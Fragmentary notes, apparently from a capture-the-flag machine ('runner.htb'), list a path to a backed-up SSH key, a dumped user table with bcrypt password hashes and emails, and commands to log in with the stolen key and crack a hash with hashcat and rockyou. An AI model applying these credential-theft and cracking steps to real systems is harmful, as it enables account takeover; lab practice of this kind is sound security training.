josh
matthew

id_rsa en backup 
```
./config/projects/AllProjects/pluginData/ssh_keys
```
``` bash

ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
1, admin, $2a$07$1WO0iJ2urPwQhgusn56a8uPbC7k1erSfCGq8aYGYsW0QE/1KJEtdK, John, john@runner.htb, 1714045777584, BCRYPT
2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1714044496565, BCRYPT

```


```
ssh -i id_rsa john@runner.htb
hashcat -a 0 -m 3200 hash_matthew /usr/share/wordlists/rockyou.txt --show

```

